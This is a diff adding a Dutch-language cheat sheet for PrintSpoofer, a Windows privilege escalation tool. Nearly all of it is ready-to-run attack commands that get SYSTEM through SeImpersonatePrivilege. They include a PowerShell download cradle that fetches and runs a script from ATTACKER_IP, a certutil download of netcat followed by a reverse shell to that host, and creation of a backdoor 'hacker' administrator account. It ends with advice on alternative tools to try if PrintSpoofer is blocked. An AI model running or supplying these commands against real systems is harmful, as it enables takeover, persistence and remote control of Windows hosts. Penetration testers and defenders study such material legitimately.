@@ -1,0 +1,40 @@
+# PrintSpoofer — Privilege escalation via Printer Spooler
+# Misbruikt SeImpersonatePrivilege om commando's als SYSTEM uit te voeren via named pipe impersonation
+#
+# === Syntax ===
+# PrintSpoofer64.exe [opties]
+#
+# === Belangrijkste opties ===
+# -i                Interactieve shell (nieuw console venster)
+# -c <command>      Commando uitvoeren als SYSTEM
+# -d <desktop>      Specifieke desktop (optioneel, voor RDP sessies)
+#
+# === Vereisten ===
+# SeImpersonatePrivilege (standaard bij service accounts, IIS AppPool, MSSQL, NETWORK SERVICE)
+# Controleer: whoami /priv
+#
+# === Voorbeelden ===
+
+# Controle of privilege aanwezig is
+whoami /priv | findstr SeImpersonate
+
+# Interactieve SYSTEM shell
+PrintSpoofer64.exe -i -c cmd
+
+# Commando uitvoeren als SYSTEM
+PrintSpoofer64.exe -c "cmd /c whoami"
+
+# Reverse shell als SYSTEM via PowerShell download cradle
+PrintSpoofer64.exe -c "cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Gebruiker toevoegen aan local Administrators
+PrintSpoofer64.exe -c "cmd /c net user hacker P@ssw0rd123 /add && net localgroup Administrators hacker /add"
+
+# Specifieke desktop (bijv. bij RDP sessie)
+PrintSpoofer64.exe -d 1 -c "cmd /c whoami"
+
+# Certutil download + uitvoeren
+PrintSpoofer64.exe -c "cmd /c certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\Windows\Tasks\nc.exe && C:\Windows\Tasks\nc.exe ATTACKER_IP 443 -e cmd.exe"
+
+# NOTE: Werkt op Windows 10/Server 2016-2019
+# NOTE: Als PrintSpoofer geblokt wordt, probeer SweetPotato of GodPotato
